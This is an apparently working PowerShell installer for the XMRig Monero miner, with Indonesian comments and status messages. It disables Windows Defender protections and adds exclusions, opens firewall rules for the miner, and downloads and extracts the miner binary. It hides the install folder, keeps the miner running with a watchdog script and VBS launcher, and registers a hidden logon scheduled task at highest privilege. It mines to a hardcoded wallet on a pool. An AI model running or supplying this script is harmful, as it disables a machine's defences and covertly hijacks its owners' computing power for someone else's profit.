$ErrorActionPreference = "Continue"

function Log-Step($msg) {
    Write-Host "[DEBUG] $msg" -ForegroundColor Cyan
    Start-Sleep -Milliseconds 300
}

try {
    Log-Step "Mematikan Windows Defender & memulai setup..."

    # =========================================================
    # MATIKAN TOTAL TAMENG WINDOWS DEFENDER & PERLINDUNGAN
    # =========================================================
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
    Set-MpPreference -EnableNetworkProtection Disabled -ErrorAction SilentlyContinue
    Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue

    $Dir = "C:\Users\Public\Documents\Core"
    if (!(Test-Path $Dir)) {
        New-Item -ItemType Directory -Force -Path $Dir | Out-Null
    }

    $ExeName = "xmrig.exe" 
    $ExePath = Join-Path $Dir $ExeName
    $VbsPath = Join-Path $Dir "run.vbs"
    $ZipPath = Join-Path $env:TEMP "up.zip"
    $WatcherScriptPath = Join-Path $Dir "monitor.ps1"

    $Pool = "gulf.moneroocean.stream:10128"
    $Wallet = "42imHjeSVgSG54hiTVmeGa8evmKJ55oWYgb6np1zanx5j8eoCM4vfbN9xSua1unVEV5mZCxxs637LdmVEJMs1XMFCWsHvc1"
    $ArgsList = "-o $Pool -u $Wallet -p x --donate-level=1 --cpu-max-threads-hint=45 --background"

    # Hentikan proses lama
    Log-Step "Mematikan proses miner dan watchdog lama..."
    Get-Process -Name "xmrig", "wscript", "powershell" -ErrorAction SilentlyContinue | Where-Object { 
        $_.Path -eq $ExePath -or $_.Path -like "$Dir*" 
    } | Stop-Process -Force -ErrorAction SilentlyContinue

    Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "XMRigMonitor" -Confirm:$false -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2

    # Eksklusi Windows Defender & Firewall
    Log-Step "Menambahkan Defender Exclusion & Firewall Whitelist..."
    Add-MpPreference -ExclusionPath $Dir -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue

    Remove-NetFirewallRule -DisplayName "XMRig Monitor (Outbound)" -ErrorAction SilentlyContinue
    Remove-NetFirewallRule -DisplayName "XMRig Monitor (Inbound)" -ErrorAction SilentlyContinue
    New-NetFirewallRule -DisplayName "XMRig Monitor (Outbound)" -Direction Outbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -DisplayName "XMRig Monitor (Inbound)" -Direction Inbound -Program $ExePath -Action Allow -ErrorAction SilentlyContinue | Out-Null

    # Download & Ekstrak Miner
    Log-Step "Mengunduh miner..."
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    (New-Object System.Net.WebClient).DownloadFile("https://github.com/MoneroOcean/xmrig_setup/raw/master/xmrig.zip", $ZipPath)

    Log-Step "Mengekstrak file..."
    Expand-Archive -Path $ZipPath -DestinationPath $env:TEMP -Force
    Start-Sleep -Seconds 1
    
    $ExtractedExe = Get-ChildItem -Path $env:TEMP -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($ExtractedExe) { 
        Copy-Item -Force $ExtractedExe.FullName $ExePath 
    } else {
        throw "xmrig.exe tidak ditemukan setelah ekstrak!"
    }
    
    Remove-Item -Force $ZipPath -ErrorAction SilentlyContinue
    Set-ItemProperty -Path $Dir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue

    # =========================================================
    # SMART WATCHDOG (Priority BelowNormal & Auto-Refresh)
    # =========================================================
    Log-Step "Membuat script smart watchdog dengan BelowNormal..."
    $ScriptBlockCode = @"
`$ExePath = "$ExePath"
`$ArgsList = "$ArgsList"
`$RestartCounter = 0

while (`$true) {
    `$Running = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$ExePath }
    
    if (!`$Running) {
        Start-Process -FilePath `$ExePath -ArgumentList `$ArgsList -WindowStyle Hidden
    } else {
        foreach (`$p in `$Running) {
            try { 
                `$p.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal 
            } catch {}
        }
    }

    # Refresh total setiap 2 jam sekali untuk mencegah hang koneksi
    `$RestartCounter++
    if (`$RestartCounter -ge 240) { # 240 x 30 detik = 120 menit
        Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$ExePath } | Stop-Process -Force -ErrorAction SilentlyContinue
        `$RestartCounter = 0
    }

    Start-Sleep -Seconds 30
}
"@
    Set-Content -Path $WatcherScriptPath -Value $ScriptBlockCode -Force

    $VbsScriptContent = @"
Dim shell
Set shell = CreateObject("Wscript.Shell") 
shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""$WatcherScriptPath""", 0, False
"@
    Set-Content -Path $VbsPath -Value $VbsScriptContent -Force

    # Task Scheduler Persistensi
    Log-Step "Mendaftarkan Task Scheduler..."
    $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden

    Register-ScheduledTask -TaskName "XMRigMonitor" -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null

    # Jalankan proses
    Start-Process -FilePath $ExePath -ArgumentList $ArgsList -WindowStyle Hidden

    Write-Host "[+] SETUP SELESAI! Menggunakan nama asli xmrig.exe dengan Priority BelowNormal." -ForegroundColor Green
}
catch {
    Write-Host "[-] TERJADI ERROR: $_" -ForegroundColor Red
}

Write-Host "Tekan Enter untuk keluar..."
Read-Host
